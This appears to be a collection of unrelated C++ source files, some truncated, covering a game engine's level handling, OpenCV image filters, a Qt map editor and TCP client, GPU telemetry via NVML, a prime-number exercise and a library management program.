    "#include \"runtime/function/framework/level/level.h\"\n\n#include \"runtime/core/base/macro.h\"\n\n#include \"runtime/resource/asset_manager/asset_manager.h\"\n#include \"runtime/resource/res_type/common/level.h\"\n\n#include \"runtime/engine.h\"\n#include \"runtime/function/character/character.h\"\n#include \"runtime/function/framework/object/object.h\"\n#include \"runtime/function/particle/particle_manager.h\"\n#include \"runtime/function/physics/physics_manager.h\"\n#include \"runtime/function/physics/physics_scene.h\"\n#include <limits>\n\nnamespace Piccolo\n{\n    void Level::clear()\n    {\n        m_current_active_character.reset();\n        m_gobjects.clear();\n\n        ASSERT(g_runtime_global_context.m_physics_manager);\n        g_runtime_global_context.m_physics_manager->deletePhysicsScene(m_physics_scene);\n    }\n\n    GObjectID Level::createObject(const ObjectInstanceRes& object_instance_res)\n    {\n        GObjectID object_id = ObjectIDAllocator::alloc();\n        ASSERT(object_id != k_invalid_gobject_id);\n\n        std::shared_ptr<GObject> gobject;\n        try\n        {\n            gobject = std::make_shared<GObject>(object_id);\n        }\n        catch (const std::bad_alloc&)\n        {\n            LOG_FATAL(\"cannot allocate memory for new gobject\");\n        }\n\n        bool is_loaded = gobject->load(object_instance_res);\n        if (is_loaded)\n        {\n            m_gobjects.emplace(object_id, gobject);\n        }\n        else\n        {\n            LOG_ERROR(\"loading object \" + object_instance_res.m_name + \" failed\");\n            return k_invalid_gobject_id;\n        }\n        return object_id;\n    }\n\n    bool Level::load(const std::string& level_res_url)\n    {\n        LOG_INFO(\"loading level: {}\", level_res_url);\n\n        m_level_res_url = level_res_url;\n\n        LevelRes   level_res;\n        const bool is_load_success = g_runtime_global_context.m_asset_manager->loadAsset(level_res_url, level_res);\n        if (is_load_success == false)\n        {\n            return false;\n        }\n\n        ASSERT(g_runtime_global_context.m_physics_manager);\n        m_physics_scene = g_runtime_global_context.m_physics_manager->createPhysicsScene(level_res.m_gravity);\n        ParticleEmitterIDAllocator::reset();\n\n        for (const ObjectInstanceRes& object_instance_res : level_res.m_objects)\n        {\n            createObject(object_instance_res);\n        }\n\n        // create active character\n        for (const auto& object_pair : m_gobjects)\n        {\n            std::shared_ptr<GObject> object = object_pair.second;\n            if (object == nullptr)\n                continue;\n\n            if (level_res.m_character_name == object->getName())\n            {\n                m_current_active_character = std::make_shared<Character>(object);\n                break;\n            }\n        }\n\n        m_is_loaded = true;\n\n        LOG_INFO(\"level load succeed\");\n\n        return true;\n    }\n\n    void Level::unload()\n    {\n        clear();\n        LOG_INFO(\"unload level: {}\", m_level_res_url);\n    }\n\n    bool Level::save()\n    {\n        LOG_INFO(\"saving level: {}\", m_level_res_url);\n        LevelRes output_level_res;\n\n        const size_t                    object_cout    = m_gobjects.size();\n        std::vector<ObjectInstanceRes>& output_objects = output_level_res.m_objects;\n        output_objects.resize(object_cout);\n\n        size_t object_index = 0;\n        for (const auto& id_object_pair : m_gobjects)\n        {\n            if (id_object_pair.second)\n            {\n                id_object_pair.second->save(output_objects[object_index]);\n                ++object_index;\n            }\n        }\n\n        const bool is_save_success =\n            g_runtime_global_context.m_asset_manager->saveAsset(output_level_res, m_level_res_url);\n\n        if (is_save_success == false)\n        {\n            LOG_ERROR(\"failed to save {}\", m_level_res_url);\n        }\n        else\n        {\n            LOG_INFO(\"level save succeed\");\n        }\n\n        return is_save_success;\n    }\n\n    void Level::tick(float delta_time)\n    {\n        if (!m_is_loaded)\n        {\n            return;\n        }\n\n        for (const auto& id_object_pair : m_gobjects)\n        {\n            assert(id_object_pair.second);\n            if (id_object_pair.second)\n            {\n                id_object_pair.second->tick(delta_time);\n            }\n        }\n        if (m_current_active_character && g_is_editor_mode == false)\n        {\n            m_current_active_character->tick(delta_time);\n        }\n\n        std::shared_ptr<PhysicsScene> physics_scene = m_physics_scene.lock();\n        if (physics_scene)\n        {\n            physics_scene->tick(delta_time);\n        }\n    }\n\n    std::weak_ptr<GObject> Level::getGObjectByID(GObjectID go_id) const\n    {\n        auto iter = m_gobjects.find(go_id);\n        if (iter != m_gobjects.end())\n        {\n            return iter->second;\n        }\n\n        return std::weak_ptr<GObject>();\n    }\n\n    void Level::deleteGObjectByID(GObjectID go_id)\n    {\n        auto iter = m_gobjects.",
    "#include \"arith.h\"\r\n\r\n\r\nminMaxfilter::minMaxfilter(int win)\r\n{\r\n\twinsize = win;\r\n}\r\n\r\nminMaxfilter::~minMaxfilter()\r\n{\r\n\tcout << \"Min Max filtering \\n\" << endl;\r\n}\r\n\r\nuchar gaussFilter::convert_float2uchar(float  src)\r\n{\r\n\tuchar dst;\r\n\tif (src < 0.5f)\r\n\t{\r\n\t\tdst = 0;\r\n\t}\r\n\telse if (src > 254.5f)\r\n\t{\r\n\t\tdst = 255;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tdst = (unsigned char)src;\r\n\t}\r\n\r\n\treturn dst;\r\n}\r\n\r\nuchar minMaxfilter::convert_double2uchar(double src)\r\n{\r\n\tuchar dst;\r\n\tif (src < 0.5f)\r\n\t{\r\n\t\tdst = 0;\r\n\t}\r\n\telse if (src > 254.5f)\r\n\t{\r\n\t\tdst = 255;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tdst = (unsigned char)src;\r\n\t}\r\n\r\n\treturn dst;\r\n}\r\n\r\n\r\nvoid minMaxfilter::execute(const Mat& src, Mat& dst)\r\n{\r\n\tdouble minvalue, maxvalue;\r\n\t\r\n\tMat gray_img, block;\r\n\tcvtColor(src, gray_img, CV_RGB2GRAY);\r\n    dst = gray_img.clone();\r\n\tint high, wight;\r\n\thigh = gray_img.rows;\r\n\twight = gray_img.cols;\r\n\tint win = winsize;\r\n\r\n\tfor (int y = win; y < high-win; y++)\r\n\t{\r\n\t\tfor (int x = win; x < wight-win; x++)\r\n\t\t{\r\n\t\t\ttry\r\n\t\t\t{\r\n\t\t\t\tblock = gray_img(Rect(x-win, y-win, 2 * win + 1, 2 * win + 1));\r\n\t\t\t\tminMaxLoc(block, &minvalue, &maxvalue);\r\n\t\t\t\tdst.at<uchar>(y, x) = convert_double2uchar(maxvalue - minvalue);\r\n\t\t\t}\r\n\t\t\tcatch (...)\r\n\t\t\t{\r\n\t\t\t\tint curx = x;\r\n\t\t\t\tint cury = y;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\ngaussFilter::gaussFilter(int win, float delt)\r\n{\r\n\twinsize = win;\r\n\tgdelt = delt;\r\n}\r\n\r\ngaussFilter::~gaussFilter()\r\n{\r\n\tdelete[] kernel;\r\n\tcout << \"Gauss Filter is doing...\\n\" << endl;\r\n}\r\n\r\nvoid gaussFilter::generateGaussKernel()\r\n{\r\n\tkernel = new float[(2*winsize+1)*(2 * winsize + 1)];\r\n\tint win = winsize;\r\n\tfloat delt = gdelt;\r\n\tint k = 0;\r\n\tfloat sumv = 0.0f;\r\n\tint num = (2 * win + 1) * (2 * win + 1);\r\n\r\n\tfor (int y = -win; y < win; y++)\r\n\t{\r\n\t\tfor (int x = -win; x < win; x++)\r\n\t\t{\r\n\t\t\tkernel[k] =  1.0f / (2 * PI * delt * delt) * exp(-(x ^ 2 + x ^ 2) / 2 / delt / delt);\r\n\t\t\tsumv += kernel[k];\r\n\t\t\tk++;\r\n\t\t}\r\n\t}\r\n\r\n\tfor (int index = 0; index < num; index++)\r\n\t{\r\n\t\tkernel[index] /= sumv;\r\n\t}\r\n}\r\n\r\nvoid gaussFilter::execute(const Mat& src, Mat& dst)\r\n{\r\n\tgenerateGaussKernel();\r\n\r\n\tint high = src.rows;\r\n\tint wight = src.cols;\r\n\tint channel = src.channels();\r\n\tdst = Mat::zeros(high, wight, src.type());\r\n\t\r\n\tMat tmprow = Mat::zeros(high, wight + 2 * winsize, src.type());\r\n\tfor (int i = 0; i < tmprow.rows; i++)\r\n\t{\r\n\t\tfor (int j = 0; j < tmprow.cols; j++)\r\n\t\t{\r\n\t\t\tif (i>=winsize && i <tmprow.rows - winsize && j >= winsize && j < tmprow.cols - winsize)\r\n\t\t\t{\r\n\t\t\t\ttmprow.at<Vec3b>(i, j) = src.at<Vec3b>(i - winsize, j - winsize);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tMat tmp = Mat::zeros(high + 2 * winsize, wight + 2 * winsize, src.type());\r\n\tmemcpy(tmp.data + winsize*(wight + 2 * winsize)*channel, tmprow.data, high*(wight + 2 * winsize)*channel);\r\n\r\n\t\r\n\tfor (int c = 0; c < channel; c++)\r\n\t{\r\n\t\tfor (int y = winsize; y < tmp.rows - winsize; y++)\r\n\t\t{\r\n\t\t\tfor (int x = winsize; x < tmp.cols - winsize; x++)\r\n\t\t\t{\r\n\t\t\t\tint k = 0;\r\n\t\t\t\tfloat sumv  = 0.0f;\r\n\t\t\t\ttry\r\n\t\t\t\t{\r\n\t\t\t\t\tfor (int indey = y - winsize; indey < y + winsize; indey++)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tfor (int index = x - winsize; index < x + winsize; index++)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tsumv += kernel[k++] * tmp.at<Vec3b>(indey, index)[c];\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t\tdst.at<Vec3b>(y-winsize, x-winsize)[c] = convert_float2uchar(sumv);\r\n\t\t\t\t}\r\n\t\t\t\tcatch (...)\r\n\t\t\t\t{\r\n\t\t\t\t\tint indexc = c;\r\n\t\t\t\t\tint indexy = y;\r\n\t\t\t\t\tint indexx = x;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}",
    "#include \"mymapmainwindow.h\"\r\n#include \"ui_mymapmainwindow.h\"\r\n#include \"parameters.h\"\r\n#include \"tankwar.h\"\r\n#include \"subwindow.h\"\r\n#\r\n\r\nMymapMainWindow::MymapMainWindow(User&user,QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::MymapMainWindow),user(user)\r\n{\r\n    ui->setupUi(this);\r\n    this->setWindowTitle(\"\u5730\u56fe\u7f16\u8f91\u5668\");\r\n    black.load(\":/pic/black.png\");\r\n    brick.load(\":/pic/brick.jpg\");\r\n    brick2.load(\":/pic/brick2.png\");\r\n    forest.load(\":/pic/forest.jpg\");\r\n    sea2.load(\":/pic/sea2.jpg\");\r\n    star.load(\":/pic/brain.jpg\");\r\n    click.load(\":/pic/click.png\");\r\n    pre_mouseposition_x = -1;\r\n    pre_mouseposition_y = -1;\r\n}\r\n\r\nMymapMainWindow::~MymapMainWindow()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid MymapMainWindow::paintEvent(QPaintEvent *event)\r\n{\r\n    painter.begin(this);\r\n    for(int i=0;i<WIDTH;i++)\r\n    {\r\n        for(int j=0;j<LENGTH;j++)\r\n        {\r\n            switch(Mymap::mymap[i * LENGTH + j])\r\n            {\r\n            case EMPTY:\r\n                painter.drawPixmap(30*j,30*i,30,30,black);\r\n                break;\r\n            case BRICK_WALL:\r\n                painter.drawPixmap(30*j,30*i,30,30,brick);\r\n                break;\r\n            case STEEL_WALL:\r\n                painter.drawPixmap(30*j,30*i,30,30,brick2);\r\n                break;\r\n            case FOREST:\r\n                painter.drawPixmap(30*j,30*i,30,30,forest);\r\n                break;\r\n            case SEA:\r\n                painter.drawPixmap(30*j,30*i,30,30,sea2);\r\n                break;\r\n            case STAR:\r\n                if(j==LENGTH/2-1&&i==WIDTH-3)\r\n                    painter.drawPixmap(30*j, 30*i, 60, 60,star);\r\n                break;\r\n            case CLICK:\r\n                painter.drawPixmap(30*j,30*i,30,30,click);\r\n                break;\r\n            }\r\n        }\r\n    }\r\n    painter.end();\r\n}\r\n\r\nvoid MymapMainWindow::mousePressEvent(QMouseEvent *ev)\r\n{\r\n    if(ev->button() == Qt::LeftButton)\r\n    {\r\n        mouseposition_x = ev -> x();\r\n        mouseposition_y = ev -> y();\r\n        mouseposition_x = mouseposition_x / 30;\r\n        mouseposition_y = mouseposition_y / 30;\r\n        if(mouseposition_x == 0 ||mouseposition_x == LENGTH - 1||mouseposition_y == 0 ||mouseposition_y == WIDTH - 1)\r\n        {\r\n            Mymap::mymap[mouseposition_y * LENGTH + mouseposition_x] = BRICK_WALL;\r\n        }\r\n        else if(Mymap::mymap[mouseposition_y * LENGTH + mouseposition_x] == STAR)\r\n        {\r\n            Mymap::mymap[mouseposition_y * LENGTH + mouseposition_x] = STAR;\r\n        }\r\n        else if(mouseposition_x < LENGTH - 1 && mouseposition_x > 0 && ispermitted(mouseposition_x,mouseposition_y))\r\n        {\r\n            if(pre_mouseposition_x != -1 && pre_mouseposition_y != -1 && Mymap::mymap[pre_mouseposition_y * LENGTH + pre_mouseposition_x] == CLICK)\r\n            {\r\n                Mymap::mymap[pre_mouseposition_y * LENGTH + pre_mouseposition_x] = EMPTY;\r\n            }\r\n            ui -> label_2 -> setText(\"\");\r\n            Mymap::mymap[mouseposition_y * LENGTH + mouseposition_x] = CLICK;\r\n        }\r\n        else if(ispermitted(mouseposition_x,mouseposition_y) == false)\r\n        {\r\n            if(pre_mouseposition_x != -1 && pre_mouseposition_y != -1 && Mymap::mymap[pre_mouseposition_y * LENGTH + pre_mouseposition_x] == CLICK)\r\n            {\r\n                Mymap::mymap[pre_mouseposition_y * LENGTH + pre_mouseposition_x] = EMPTY;\r\n            }\r\n            ui -> label_2 -> setText(\"\u6b64\u5904\u4e0d\u80fd\u653e\u7f6e\u65b9\u5757\uff01\");\r\n            QFont font = ui -> label_2 -> font();\r\n            font.setPointSize(14);\r\n            ui -> label_2 ->setFont(font);\r\n        }\r\n        pre_mouseposition_x = mouseposition_x;\r\n        pre_mouseposition_y = mouseposition_y;\r\n        update();\r\n    }\r\n}\r\n\r\nvoid MymapMainWindow::setarraydatas(int *array)\r\n{\r\n    for(int i = 0;i < WIDTH;i++)\r\n    {\r\n        for(int j = 0;j < LENGTH;j++)\r\n        {\r\n            Mymap::mymap[i * LENGTH + j] = array[i * LENGTH + j];\r\n        }\r\n    }\r\n}\r\n\r\nbool MymapMainWindow::ispermitted(int x,int y)\r\n{\r\n    if(((x>2 && x<6) && (y>0 && y<4))||((x>16 && x<20) && (y>0 && y<4))||((x>30 && x<34) && (y>0 && y<4)))\r\n    {\r\n        return false;\r\n    }\r\n    else if(((x>13 && x<17) && (y>25 && y<29))||((x>25 && x<29) && (y>25 && y<29)))\r\n    {\r\n        return false;\r\n    }\r\n    else\r\n    {\r\n        return true;\r\n    }\r\n}\r\n\r\n\r\nvoid MymapMainWindow::on_pushButton_clicked()\r\n{\r\n    if(mouseposition_x == 0 ||mouseposition_x == LENGTH - 1||mouseposition_y == 0 ||mouseposition_y == WIDTH - 1)\r\n    {\r\n        Mymap::mymap[mouseposition_y * LENGTH + mouseposition_x] = BRICK_WALL;\r\n    }\r\n    else if(Mymap::mymap[mouseposition_y * LENGTH + mouseposition_x] == STAR)\r\n    {\r\n        Mymap::mymap[mouseposition_y * LENGTH + mouseposition_x] = STAR;\r\n    }\r\n    else if(mouseposition_x < LENGTH - 1 && mouseposition_x > 0 && ispermitted(mouseposition_x,mouseposition_y))\r\n    {\r\n        Mymap::mymap[mouseposition_y * LENGTH + mouseposition_x] = BRICK_WALL;\r\n    }\r\n    update();\r\n}\r\n\r\n\r\nvoid MymapMainW",
    "// CPP_XuatSNTtrongArrays.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\nusing namespace std;\nbool checkSNT(int so)\n{\n\tint dem = 0;\n\tfor (int i = 1; i <= so; i++)\n\t{\n\t\tif (so % i == 0)\n\t\t{\n\t\t\tdem++;\n\t\t}\n\t}\n\tif (dem == 2)\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\nint main()\n{\n\tcout << \"Hello World!\\n\";\n\tint A[5];\n\tfor (int i = 0; i < 5; i++)\n\t{\n\t\tcout << \"Nhap phan tu thu \" << i << \":\";\n\t\tcin >> A[i];\n\t}\n\tfor (int x : A)\n\t\tcout << x << \" \";\n\n\tfor (int i = 0; i < 5; i++)\n\t{\n\t\tif (checkSNT(A[i])) cout << \"\\n So NT: \" << A[i] << \" \";\n\t}\n}\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "#include <iostream>\n#include <chrono>\n#include <expected>\n#include <thread>\n#include <unordered_map>\n#include <cstdlib>\n#include <format>\n\n#include <stdlib.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <sys/mman.h>\n#include <signal.h>\n\n#ifndef NO_DRAM_TELEMETRY\nextern \"C\" {\n    #include <pci/pci.h>\n}\n#endif\n\n#include <reflect>\n#include <range/v3/all.hpp>\n#include <nvml.h>\n\n\ntemplate <typename T>\nusing nvField = std::expected<T, nvmlReturn_t>;\n\ntemplate <typename T>\nauto nvCheckCall(nvField<T>& res, nvmlReturn_t val) -> bool {\n    if (val != NVML_SUCCESS) {\n        res = std::unexpected(val);\n        return false;\n    }\n    return true;\n}\n\nstruct nvml_gpu_data\n{\n    nvField<uint32_t> tag_index;\n    nvField<std::string> tag_name;\n    nvField<std::string> tag_bus_id;\n    nvField<std::string> tag_uuid;\n    nvField<uint16_t> dev_id;\n    nvField<uint32_t> pcie_link_gen_current;\n    nvField<uint32_t> pcie_link_gen_max;\n    nvField<uint32_t> pcie_link_width_current;\n    nvField<uint32_t> pcie_link_width_max;\n    nvField<uint32_t> persistence_mode;\n    nvField<uint32_t> fan_speed;\n    nvField<uint32_t> pstate;\n    nvField<bool> clock_throttle_reason_sw_power_cap;\n    nvField<bool> clock_throttle_reason_hw_slowdown;\n    nvField<bool> clock_throttle_reason_hw_thermal_slowdown;\n    nvField<bool> clock_throttle_reason_hw_power_brake_slowdown;\n    nvField<bool> clock_throttle_reason_sw_thermal_slowdown;\n    nvField<bool> clock_throttle_reason_sync_boost;\n    nvField<uint64_t> memory_total;\n    nvField<uint64_t> memory_used;\n    nvField<std::string> compute_cap;\n    nvField<float> utilization_gpu;\n    nvField<float> utilization_memory;\n    nvField<uint32_t> temperature_gpu;\n    nvField<uint32_t> power_draw;\n    nvField<uint32_t> power_limit;\n    nvField<uint32_t> clocks_gr;\n    nvField<uint32_t> clocks_sm;\n    nvField<uint32_t> clocks_mem;\n    nvField<uint32_t> clocks_video;\n\n    static nvml_gpu_data from_handle(nvmlDevice_t device) {\n        nvml_gpu_data data;\n\n        char name[NVML_DEVICE_NAME_BUFFER_SIZE];\n        if (nvCheckCall(data.tag_name, nvmlDeviceGetName(device, name, NVML_DEVICE_NAME_BUFFER_SIZE))) {\n            data.tag_name = name;\n        }\n        nvmlPciInfo_t pci_info;\n        if (nvCheckCall(data.tag_bus_id, nvmlDeviceGetPciInfo_v3(device, &pci_info))) {\n            data.tag_bus_id = pci_info.busId;\n            data.dev_id = pci_info.pciDeviceId;\n        }\n        char uuid[NVML_DEVICE_UUID_V2_BUFFER_SIZE];\n        if (nvCheckCall(data.tag_uuid, nvmlDeviceGetUUID(device, uuid, NVML_DEVICE_UUID_V2_BUFFER_SIZE))) {\n            data.tag_uuid = uuid;\n        }\n        uint32_t pcie_link_gen_current;\n        if (nvCheckCall(data.pcie_link_gen_current, nvmlDeviceGetCurrPcieLinkGeneration(device, &pcie_link_gen_current))) {\n            data.pcie_link_gen_current = pcie_link_gen_current;\n        }\n        uint32_t pcie_link_gen_max;\n        if (nvCheckCall(data.pcie_link_gen_max, nvmlDeviceGetMaxPcieLinkGeneration(device, &pcie_link_gen_max))) {\n            data.pcie_link_gen_max = pcie_link_gen_max;\n        }\n        uint32_t pcie_link_width_current;\n        if (nvCheckCall(data.pcie_link_width_current, nvmlDeviceGetCurrPcieLinkWidth(device, &pcie_link_width_current))) {\n            data.pcie_link_width_current = pcie_link_width_current;\n        }\n        uint32_t pcie_link_width_max;\n        if (nvCheckCall(data.pcie_link_width_max, nvmlDeviceGetMaxPcieLinkWidth(device, &pcie_link_width_max))) {\n            data.pcie_link_width_max = pcie_link_width_max;\n        }\n        nvmlEnableState_t persistence_mode;\n        if (nvCheckCall(data.persistence_mode, nvmlDeviceGetPersistenceMode(device, &persistence_mode))) {\n            data.persistence_mode = (persistence_mode == NVML_FEATURE_ENABLED);\n        }\n        uint32_t fan_speed;\n        if (nvCheckCall(data.fan_speed, nvmlDeviceGetFanSpeed(device, &fan_speed))) {\n            data.fan_speed = fan_speed;\n        }\n        nvmlPstates_t pstate;\n        if (nvCheckCall(data.pstate, nvmlDeviceGetPerformanceState(device, &pstate))) {\n            data.pstate = (int)pstate;\n        }\n        unsigned long long clock_event_reasons;\n        if (nvCheckCall(data.clock_throttle_reason_sw_power_cap, nvmlDeviceGetCurrentClocksEventReasons(device, &clock_event_reasons))) {\n            data.clock_throttle_reason_sw_power_cap = (clock_event_reasons & nvmlClocksThrottleReasonSwPowerCap) != 0;\n            data.clock_throttle_reason_hw_slowdown = (clock_event_reasons & nvmlClocksThrottleReasonHwSlowdown) != 0;\n            data.clock_throttle_reason_hw_thermal_slowdown = (clock_event_reasons & nvmlClocksThrottleReasonHwThermalSlowdown) != 0;\n            data.clock_throttle_reason_hw_power_brake_slowdown = (clock_event_reasons & nvmlClocksThrottleReasonHwPowerBrakeSlowdown) != 0;\n            data.clock_throttle_reason_sw_thermal_slowdown = (clock_event_reasons & nvmlClocksThrottleReasonSwThermalSlowdown) != 0;\n            data.clock_throttle_reason_sync_boost = (clock_event_r",
    "#include \"tcpclient.h\"\r\n#include \"ui_tcpclient.h\"\r\n#include <QTcpSocket>\r\n#include <QHostInfo>\r\n\r\ntcpclient::tcpclient(QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::tcpclient)\r\n{\r\n    ui->setupUi(this);\r\n\r\n    tcpSocket=new QTcpSocket(this);   //\u521b\u5efaTCPSocket\u5bf9\u8c61\r\n    //\u663e\u793a\u72b6\u6001\r\n    labSocketState=new QLabel(\"Socket\u72b6\u6001\");\r\n    labSocketState->setMidLineWidth(150);\r\n    ui->statusBar->addWidget(labSocketState);\r\n    labSocketState->setStyleSheet(\"QLabel { color: white; }\");\r\n    //\u83b7\u53d6ip\r\n    QString hostName=QHostInfo::localHostName();\r\n    QHostInfo hostInfo=QHostInfo::fromName(hostName);\r\n    //ipv4\r\n    QString localIP;\r\n    foreach (const auto& item, hostInfo.addresses()) {\r\n        if(item.protocol()==QAbstractSocket::IPv4Protocol)\r\n        {\r\n            localIP=item.toString();\r\n            break;\r\n        }\r\n    }\r\n\r\n    // QString addr=ui->comboServer->currentText();\r\n    // quint16 port=ui->spinPort->value();\r\n    // tcpSocket->connectToHost(addr,port);\r\n\r\n    //\u94fe\u63a5\u65f6\u8c03\u7528\u56db\u4e2a\u51fd\u6570\r\n\r\n    connect(tcpSocket,&QTcpSocket::connected,this,&tcpclient::do_connected);\r\n    connect(tcpSocket,&QTcpSocket::disconnected,this,&tcpclient::do_disconnected);\r\n    connect(tcpSocket,&QTcpSocket::readyRead,this,&tcpclient::do_readyRead);\r\n    connect(tcpSocket,&QTcpSocket::stateChanged,this,&tcpclient::do_stateChanged);\r\n\r\n\r\n    QString toolbarStyle(\"QToolBar QToolButton { color: rgb(255, 255, 255); }\");\r\n    ui->toolBar->setStyleSheet(toolbarStyle);\r\n}\r\n\r\ntcpclient::~tcpclient()\r\n{\r\n    delete ui;\r\n}\r\n\r\n\r\n\r\nvoid tcpclient::do_connected()\r\n{\r\n    ui->textEdit->appendPlainText(\"**\u5df2\u8fde\u63a5\u670d\u52a1\u5668**\");\r\n    ui->textEdit->appendPlainText(\"**peer address:\"+tcpSocket->peerAddress().toString());\r\n    ui->textEdit->appendPlainText(\"**peer port\uff1a\"+QString::number(tcpSocket->peerPort()));\r\n    ui->actConnect->setEnabled(false);\r\n    ui->actDisconnect->setEnabled(true);\r\n\r\n\r\n}\r\n\r\nvoid tcpclient::do_disconnected()\r\n{\r\n    ui->textEdit->appendPlainText(\"**\u670d\u52a1\u5668disconnected**\");\r\n    ui->actConnect->setEnabled(true);\r\n    ui->actDisconnect->setEnabled(false);\r\n}\r\n\r\nvoid tcpclient::do_readyRead()\r\n{\r\n    while(tcpSocket->canReadLine())\r\n        ui->textEdit->appendPlainText(\"[in] \"+tcpSocket->readLine());\r\n}\r\n\r\nvoid tcpclient::do_stateChanged(QAbstractSocket::SocketState state)\r\n{\r\n    switch (state)\r\n        {\r\n        case QAbstractSocket::UnconnectedState:\r\n            labSocketState->setText(\"socket\u72b6\u6001\uff1aUnconnectedState\");\r\n            break;\r\n        case QAbstractSocket::HostLookupState:\r\n            labSocketState->setText(\"socket\u72b6\u6001\uff1aHostLookupState\");\r\n            break;\r\n        case QAbstractSocket::ConnectingState:\r\n            labSocketState->setText(\"socket\u72b6\u6001\uff1aConnectingState\");\r\n            break;\r\n        case QAbstractSocket::ConnectedState:\r\n            labSocketState->setText(\"socket\u72b6\u6001\uff1aConnectedState\");\r\n            break;\r\n        case QAbstractSocket::BoundState:\r\n            labSocketState->setText(\"socket\u72b6\u6001\uff1aBoundState\");\r\n            break;\r\n        case QAbstractSocket::ClosingState:\r\n            labSocketState->setText(\"socket\u72b6\u6001\uff1aClosingState\");\r\n            break;\r\n        case QAbstractSocket::ListeningState:\r\n            labSocketState->setText(\"socket\u72b6\u6001\uff1aListeningState\");\r\n        }\r\n}\r\n\r\n\r\nvoid tcpclient::on_actConnect_triggered()\r\n{\r\n    QString addr=ui->comboServer->currentText();\r\n    quint16 port=ui->spinPort->value();\r\n    tcpSocket->connectToHost(addr,port);\r\n    qDebug() << \"Server Address: \" << addr;\r\n    qDebug() << \"Port: \" << port;\r\n    on_btnSend_clicked();\r\n}\r\n\r\n\r\nvoid tcpclient::on_actDisconnect_triggered()\r\n{\r\n    if(tcpSocket->state()==QAbstractSocket::ConnectedState)\r\n        tcpSocket->disconnectFromHost(); //\u65ad\u8fde\r\n}\r\n\r\n\r\nvoid tcpclient::on_actClear_triggered()\r\n{\r\n    ui->textEdit->clear();\r\n}\r\n\r\n\r\nvoid tcpclient::on_btnSend_clicked()\r\n{\r\n    QString msg=ui->editMsg->text();\r\n    QString zh=ui->labNum->text();\r\n    QString name=ui->labName->text();\r\n    QString Name=ui->labname->text();\r\n    ui->textEdit->appendPlainText(\"[out] \"+msg);\r\n    ui->textEdit->appendPlainText(\"\");\r\n    ui->editMsg->clear();\r\n    ui->editMsg->setFocus();\r\n\r\n    QByteArray str=msg.toUtf8();\r\n    QByteArray str2=zh.toUtf8();\r\n    QByteArray str3=name.toUtf8();\r\n    QByteArray str4=Name.toUtf8();\r\n    str.append('\\n');\r\n    qDebug()<<\"\u4f20\u8f93\u7684\u6570\u636e=\"<<str2+\" \"+str3+\" \"+str4+\" \"+str;\r\n    if(  tcpSocket->write(str2+\" \"+str3+\" \"+str4+\" \"+str)==-1)\r\n    {\r\n        qDebug(\"\u53d1\u9001\u5931\u8d25\");\r\n    }\r\n\r\n}\r\n\r\nvoid tcpclient::setNickName(QString nickname)\r\n{\r\n    ui->labName->setText(nickname);\r\n}\r\n\r\nvoid tcpclient::setNickNum(QString nicknum)\r\n{\r\n    ui->labNum->setText(nicknum);\r\n}\r\n\r\nvoid tcpclient::setNickname(QString nickname)\r\n{\r\n    ui->labname->setText(nickname);\r\n}\r\n\r\n",
    "//Library Management System applying OOP concepts\r\n/*include fuctions like\r\n    1.add book\r\n    2.delete book\r\n    3.edit book\r\n    4.search book\r\n    5.view books\r\n    6.exit\r\n */\r\n#include<iostream> \r\n#include<conio.h>\r\n#include<string>\r\n\r\nusing namespace std;\r\n\r\nclass Book {\r\n\tprivate:\r\n\t\tstring isbn,title,author,edition,publication; //private variables\r\n\tpublic:\r\n\t\t//setters - assigning user value to private variables\r\n\t\tvoid setIsbn(string a){isbn = a;}\r\n\t\tvoid setTitle(string b){title = b;}\r\n\t\tvoid setAuthor(string c){author = c;}\r\n\t\tvoid setEdition(string d){edition = d;}\r\n\t\tvoid setPublication(string e){publication = e;}\r\n\t\t//getters - getting the values from private variables\r\n\t\tstring getIsbn(){return isbn;}\r\n\t\tstring getTitle(){return title;}\r\n\t\tstring getAuthor(){return author;}\r\n\t\tstring getEdition(){return edition;}\r\n\t\tstring getPublication(){return publication;}\r\n};\r\n\r\n//initializing functions with counter as parameter\r\nvoid addBook(int counter);\r\nvoid deleteBook(int counter);\r\nvoid editBook(int counter);\r\nvoid searchBook(int counter);\r\nvoid viewAllBooks(int counter);\r\nvoid quit();\r\n\r\n\r\nint counter=0;\r\n\r\nvoid increment(int a){\r\n\ta++;\r\n\tcounter=a;\r\n}\r\n\r\n//function for decrementing counter\r\nvoid decrement(int a){\r\n\ta--;\r\n\tcounter=a;\r\n}\r\n\r\n//Book class array initialization\r\nBook books[10];\r\n\r\n\r\nint main(){\r\nstring choice;\r\n\r\nsystem(\"CLS\");\r\ncout<<\"LIBRARY MANAGEMENT SYSTEM\\n\\n\";\r\ncout<<\"[1]ADD BOOK\\n\";\t\r\ncout<<\"[2]DELETE BOOK\\n\";\t\r\ncout<<\"[3]EDIT BOOK\\n\";\t\r\ncout<<\"[4]SEARCH BOOK\\n\";\t\r\ncout<<\"[5]VIEW ALL BOOKS\\n\";\t\r\ncout<<\"[6]QUIT\\n\\n\";\r\n\r\ncout<<\"ENTER CHOICE: \";\r\ngetline(cin,choice);\r\nsystem(\"CLS\");\r\n\r\nif(choice==\"1\"){\r\n\taddBook(counter); \r\n}\t\t\r\nelse 